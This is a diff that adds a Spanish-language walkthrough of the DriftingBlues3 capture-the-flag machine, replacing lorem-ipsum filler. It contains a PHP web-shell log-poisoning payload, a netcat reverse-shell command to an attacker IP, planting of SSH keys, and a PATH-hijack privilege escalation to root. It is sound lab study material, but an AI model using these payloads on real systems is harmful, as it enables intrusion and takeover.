@@ -17,102 +17,150 @@ No es un reto extremadamente dificil en el aprendemos como usar el path para esc
 - urlencoder
 - https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
 
-Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.
+### Enumeracion y escaneo
 
-## Another great heading (h2)
+Empezamos averiguando la ip de la maquina victima para ello ejecutamos la herramienta arp-scan nos fijamos en el resultado y buscamos la mac que empieza por 08:00 esa mac es de virtualbox.
 
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt. Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit.
+Ejecutamos:
 
-### Some great subheading (h3)
+```bash
+sudo arp-scan --localnet
+```
+![800x600](assets/driftingblues3/arp-scan.png)
 
-Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum. In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum.
+Una vez obtenida la ip pasamos al escanear puertos
 
-Phasellus et hendrerit mauris. Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.
+```bash
+nmap -A -n -p- ipvictima
+```
+![800x600](assets/driftingblues3/nmap.png)
 
-### Some great subheading (h3)
+Vemos que nos muestra el 22 y el 80 y en el 80 ya nos muestra una ruta /eventeadmins que debe de extraerla del fichero robots.txt todo esto lo puedes ver por firefox directamente.
 
-Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.
+![800x600](assets/driftingblues3/eventadmins.png)
 
-> This quote will change your life. It will reveal the secrets of the universe, and all the wonders of humanity. Don't misuse it.
+Revisamos la pagina y del texto podemos ver dos nombre de posibles usuarios uno john y el otro es buddyG , tambien nos dice que cheqeemos /littlequeenofspades.html
 
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce bibendum neque eget nunc mattis eu sollicitudin enim tincidunt.
+![800x600](assets/driftingblues3/littlequeen.png)
 
-### Some great subheading (h3)
+Revisamos la pagina y a simple vista a mi no me dice nada , pero revisando su codigo encuentro un cifrado en base64  nos copiamos el churro y procedemos a decodificarlo.
 
-Vestibulum lacus tortor, ultricies id dignissim ac, bibendum in velit. Proin convallis mi ac felis pharetra aliquam. Curabitur dignissim accumsan rutrum.
+El resultado de la primera decodificacion nos da otro codigo base64 , decodificamos los dos y nos da una ruta.
 
-```html
-<html>
-  <head>
-  </head>
-  <body>
-    <p>Hello, World!</p>
-  </body>
-</html>
+![800x600](assets/driftingblues3/base64-d.png)
+
+Vamos a la ruta que nos proporciono el codigo adminsfixit.php y vemos que es es el auth log ssh.
+
+![800x600](assets/driftingblues3/ssh-auth-log.png)
+
+Si intentamos login con cualuier usuario vemos que aparece reflejado en el log al refrescar la pagina.
+
+![800x600](assets/driftingblues3/ssh-loco.png)
+![800x600](assets/driftingblues3/log-loco.png)
+
+Ahora es el momento de intentar envenenar el log para nuestro beneficio subiendo una carga util que nos permita ejecutar codigo de manera remota "RCE"
+
+```bash
+ssh <?php echo shell_exec($_GET['cmd']); ?>@ipvictima
 ```
 
+![690x225](assets/driftingblues3/cargautil.png)
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+Si ha funcionado deberiamos de poder ejuctar codigo con la siguiente ruta:  http://$ipvictima/adminsfixit.php?cmd=ls
+Para que los resultados sean mas visibles podemos visualizar la pagina por su codigo fuente.
 
-#### You might want a sub-subheading (h4)
+![632x616](assets/driftingblues3/prompt-ls.png)
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+Desde mi punto de vista ya conseguimos lo mas complicado , ahora lo mejor en mandarnos una reverse shell , para ello ejecutamos tanto en nuestro equipo como en la victima netcat.
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+Primero ponemos a la escucha la maquina atacante con :
 
-#### But it's probably overkill (h4)
+```bash
+nc -lnvp 80 
+```
+Y en la victima si fuera necesario podemos encodear la url  para ello vamos a urlencoder.org
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+```bash
+http://$ipvictima/adminsfixit.php?cmd=nc%20-e%20%2Fbin%2Fsh%20192.168.0.112%2080
+```
+![654x76](assets/driftingblues3/shell.png)
 
-##### Could be a smaller sub-heading, `pacman` (h5)
+Ya tenemos la shell en nuestra maquina ahora toca hacerla interactiva 
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+```bash
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+```
 
-###### Small yet significant sub-heading  (h6)
+Encontramos un usario en home robertj el cual tiene el fichero user.txt el cual no podemos leer por permisos pues aun somos el usario  www-data.
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+Vamos a probar a crear las claves  ssh para poder conectarnos por ssh con ese usario antes deberiamos comprobar la config de sshd para ver si el usuario tiene el authorized keys activado si no esta olvidemos esta escalada.
 
-### Oh hai, an unordered list!!
+Podemos crearlas en cualquier lugar pero mejor nos posicionamos en el directio .ssh de su home asi no la movemos despues
+```bash
+ssh-keygen -f robertj
+```
+Una vez creadas copiamos la clave publica a authorized_keys dentro de .ssh "obvio" y nos copiamos la privada a nuestra maquina atacante.
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+```bash
+cp clavepublica authorized_keys
+```
 
-- First item, yo
-- Second item, dawg
-- Third item, what what?!
-- Fourth item, fo sheezy my neezy
+Probamos a conectar por ssh
 
-### Oh hai, an ordered list!!
+```bash
+ssh -i robertj robertj@192.168.0.102
+```
 
-In arcu magna, aliquet vel pretium et, molestie et arcu. Mauris lobortis nulla et felis ullamcorper bibendum. Phasellus et hendrerit mauris.
+Si lo hacemos tal y como se crearon las claves y copiamos a mi no me funciono hay que modificar los permisos y ponerlos solo de lectura para el propietario
 
-1. First item, yo
-2. Second item, dawg
-3. Third item, what what?!
-4. Fourth item, fo sheezy my neezy
+```bash
+ chmod 400 robertj
+```
+ Volvemos a ejecutar ahora nos pide la contraseña que dimos cuando crearmos las claves 
+ 
+ ![654x76](assets/driftingblues3/robertj.png)
+ 
+ Una vez dentro cat al user.txt para obtener la flag
+ 
+> 413f**********"***
 
+Una vez como el usuario comprobamos si hay algun binario que pueda ejecutar como root con sudo y tambien binarios con suid
 
+```bash
+sudo -l
+find /  -perm /4000
+```
+![538x541](assets/driftingblues3/sudofind.png)
 
-## Headings are cool! (h2)
+El binario en cuestion es getinfo y nos vamos a aprovechar  y alterar el path.
 
-Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc. Praesent varius interdum vehicula. Aenean risus libero, placerat at vestibulum eget, ultricies eu enim. Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.
+getinfo hace uso de cat , asi que nos creammos un fichero de nombre cat con el contenido /bin/bash y añadimos la ruta donde tengamos nuestro cat trucado a nuestro path
+  
+```bash
+echo /bin/bash > cat
+```
 
-Praesent nulla tortor, malesuada adipiscing adipiscing sollicitudin, adipiscing eget est.
+Le damos permisos de ejucion para todos.
 
-Proin eget nibh a massa vestibulum pretium. Suspendisse eu nisl a ante aliquet bibendum quis a nunc.
+```bash
+chmod 777 cat
+```
 
-### Tables
+Añadimos nuestra ruta al path 
 
-Title 1               | Title 2               | Title 3               | Title 4
---------------------- | --------------------- | --------------------- | ---------------------
-lorem                 | lorem ipsum           | lorem ipsum dolor     | lorem ipsum dolor sit
-lorem ipsum dolor sit | lorem ipsum dolor sit | lorem ipsum dolor sit | lorem ipsum dolor sit
-lorem ipsum dolor sit | lorem ipsum dolor sit | lorem ipsum dolor sit | lorem ipsum dolor sit
-lorem ipsum dolor sit | lorem ipsum dolor sit | lorem ipsum dolor sit | lorem ipsum dolor sit
+```bash
+export  PATH=/tmp:$PATH 
+ ```
 
+En el comando anterior veis en directorio que he usado para crear el cat malicioso , comprobamos que nuestro directorio este en el PATH.
 
-Title 1 | Title 2 | Title 3 | Title 4
---- | --- | --- | ---
-lorem | lorem ipsum | lorem ipsum dolor | lorem ipsum dolor sit
-lorem ipsum dolor sit amet | lorem ipsum dolor sit amet consectetur | lorem ipsum dolor sit amet | lorem ipsum dolor sit
-lorem ipsum dolor | lorem ipsum | lorem | lorem ipsum
-lorem ipsum dolor | lorem ipsum dolor sit | lorem ipsum dolor sit amet | lorem ipsum dolor sit amet consectetur
+```bash
+echo $PATH
+```
+![663x43](assets/driftingblues3/path.png)
+
+Ahora estamos listos para ejecutar getinfo ni bien se ejecute deberia leer nuestro cat trucado y hacernos root al toque
+
+![800x600](assets/driftingblues3/root.png)
+
+Acordaros de la flag si os interesa , gracias por leer mis apuntes.
